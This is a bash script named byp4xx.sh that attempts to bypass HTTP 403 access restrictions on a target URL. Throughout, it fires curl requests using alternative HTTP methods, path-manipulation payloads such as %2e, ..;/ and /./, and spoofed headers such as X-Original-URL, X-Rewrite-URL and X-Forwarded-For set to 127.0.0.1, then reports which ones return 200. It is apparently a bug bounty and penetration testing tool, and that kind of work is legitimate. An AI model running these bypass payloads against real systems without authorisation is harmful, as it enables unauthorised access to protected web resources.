#!/bin/bash

#Show usage
if [ "$#" -ne 1 ]
then
	echo "Usage: ./byp4xx.sh http://url/path/"
	exit
fi

#Check URL starts with http*
echo $1 | grep -i ^http > /dev/null
if [ $? -gt 0 ] 
then
	echo "Note: Start your url with http:// or https://"
	exit
fi

#Parse URL and DIR
URL=$(echo $1 | cut -d "/" -f -3)"/"
DIR=$(echo $1 | cut -d "/" -f 4- | sed -e 's/\/$//g')
echo
#HTTP Verbs/Methods
echo -e "\e[1m\e[32m----HTTP Methods----\e[0m"
echo -n "GET request: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $URL$DIR)
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "POST request: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -H "Content-Length:0" -X POST $URL$DIR)
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "HEAD request: "
STATUS=$(curl -k -s -o /dev/null -m 1.0 -w "%{http_code}" -X HEAD $URL$DIR)
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "OPTIONS request: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -X OPTIONS $URL$DIR)
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "PUT request: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -X PUT $URL$DIR)
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi

#DELETE disable by default
#echo -n "DELETE request: "

echo -n "TRACE request: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -X TRACE $URL$DIR)
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "TRACK request: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -X TRACK $URL$DIR)
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "CONNECT request: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -X CONNECT $URL$DIR)
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "PATCH request: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -X PATCH $URL$DIR)
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo
#Bugbountytips methods compilation
echo -e "\e[1m\e[32m----403 bypass methods----\e[0m"
echo -n "%2e payload: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $URL%2e/$DIR)
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "/. payload: "
STATUS=$(curl -k -s -o /dev/null --path-as-is -w "%{http_code}" -X GET "$URL$DIR/.")
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "? payload: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $URL$DIR?)
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "?? payload: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $URL$DIR??)
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "// payload: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $URL/$DIR//)
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "/./ payload: "
STATUS=$(curl -k -s -o /dev/null --path-as-is -w "%{http_code}" -X GET $URL./$DIR/./)
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "/ payload: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $URL$DIR/)
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "/.randomstring payload: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -X GET "$URL$DIR/".randomstring)
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "..;/ payload: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -X GET "$URL$DIR..;/")
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo
#HEADERS
echo -e "\e[1m\e[32m----HEADERS----\e[0m"
echo -n "Referer payload: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -H "Referer: $URL$DIR" -X GET "$URL$DIR")
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "X-Custom-IP-Authorization payload: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL$DIR")
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "X-Custom-IP-Authorization+..;/ payload: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL$DIR..;/")
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "X-Original-URL payload: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Original-URL: /$DIR" -X GET $URL"anything")
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "X-Rewrite-URL payload: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Rewrite-URL: /$DIR" -X GET "$URL")
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "X-Originating-IP payload: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Originating-IP: 127.0.0.1" -X GET "$URL$DIR")
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "X-Forwarded-For payload: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Forwarded-For: 127.0.0.1" -X GET "$URL$DIR")
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "X-Remote-IP payload: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Remote-IP: 127.0.0.1" -X GET "$URL$DIR")
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "X-Client-IP payload: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Client-IP: 127.0.0.1" -X GET "$URL$DIR")
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "X-Host payload: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Host: 127.0.0.1" -X GET "$URL$DIR")
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
echo -n "X-Forwared-Host payload: "
STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Forwared-Host: 127.0.0.1" -X GET "$URL$DIR")
if [ $STATUS -eq 200 ]
then
	echo -e "\e[1m\e[32m$STATUS\e[0m"
else
echo -e "\e[1m\e[31m$STATUS\e[0m"
fi
